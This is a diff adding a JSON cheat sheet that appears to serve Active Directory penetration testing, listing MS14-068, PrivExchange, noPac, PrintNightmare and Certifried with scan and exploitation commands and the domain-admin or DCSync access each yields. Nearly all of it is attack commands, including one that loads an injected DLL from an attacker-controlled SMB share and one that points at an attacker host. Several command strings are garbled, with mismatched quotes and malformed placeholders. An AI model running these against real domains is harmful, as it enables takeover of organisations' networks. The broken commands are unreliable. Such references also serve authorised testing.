@@ -1,0 +1,79 @@
+{
+  "Known Vulnerabilities": {
+    "MS14-068": {
+      "detection": "FindSMB2UPTime.py <ip>",
+      "exploitation": {
+        "step1": {
+          "commands": [
+            "rpcclient $> lookupnames <name>",
+            "wmic useraccount get name,sid",
+            "auxiliary/admin/kerberos/ms14_068_kerberos_checksum"
+          ]
+        },
+        "step2": "goldenPac.py -dc-ip <dc-ip> <domain>/<user>:<password>@<target>",
+        "result": {
+          "access_gained": ["dom admin", "Admin"],
+          "method": "Pass the ticket"
+        }
+      }
+    },
+    "privexchange": {
+      "cve": ["CVE-2019-0724", "CVE-2019-0686"],
+      "command": "python privexchange.py -ah <attacker_host_or_ip> -exchandge_host> -u <user> -d <domain> -p <password>",
+      "result": {
+        "action": "Coerce HTTP ->",
+        "access_gained": ["dom admin", "Admin"]
+      }
+    },
+    "SamAccountName / nopac": {
+      "cve": ["CVE-2021-42287", "CVE-2021-42278"],
+      "scan": "cme smb <ip> -u <user> -p <password> -M nopac",
+      "exploitation": {
+        "step1": {
+          "command": "noPac.exe -domain <domain> -user <user> -pass <pass> /dc <dc_fqdn> /mAccount <machine_account> /mPassword <machine_password> <machine_pass> /service cifs /ptt"
+        },
+        "step2": {
+          "note": "with ImpactKit",
+          "tools": [
+            "addcomputer.py",
+            "addspn.py",
+            "renameMachine.py",
+            "getTGT.py",
+            "renameMachine.py",
+            "getST.py"
+          ]
+        },
+        "result": {
+          "access_gained": ["DCSYNC", "DOM ADMIN"],
+          "method": "Pass the ticket",
+          "additional_capability": "Delete computer"
+        }
+      }
+    },
+    "PrintNightmare": {
+      "cve": ["CVE-2021-1675", "CVE-2021-34527"],
+      "command": "CVE-2021-1675.py <domain>/<user>:<password>@<target> '\\\\smb_server_ip>\\share\\inject.dll'",
+      "result": "Admin"
+    },
+    "Certifried": {
+      "cve": "CVE-2022-26923",
+      "note": "need ADCS",
+      "exploitation_chain": [
+        {
+          "step1": "certipy account create -u user$@<domain> -p <password> -user 'certifiedpc' -pass 'certifiedpass' -dns '<fqdn.dc>'"
+        },
+        {
+          "step2": "certipy req -u 'certifiedpc$@<domain> -p ' -certifiedpass' -target <ca_fqdn> -ca <ca_name> -template Machine"
+        },
+        {
+          "step3": "certipy auth -pfx <pfx_file> -username '<dc>$' -domain <domain> -dc-ip <dc_ip>"
+        }
+      ],
+      "result": {
+        "access_gained": ["DCSYNC", "DOM ADMIN"],
+        "method": "Pass the ticket",
+        "additional_capability": "Delete computer"
+      }
+    }
+  }
+}
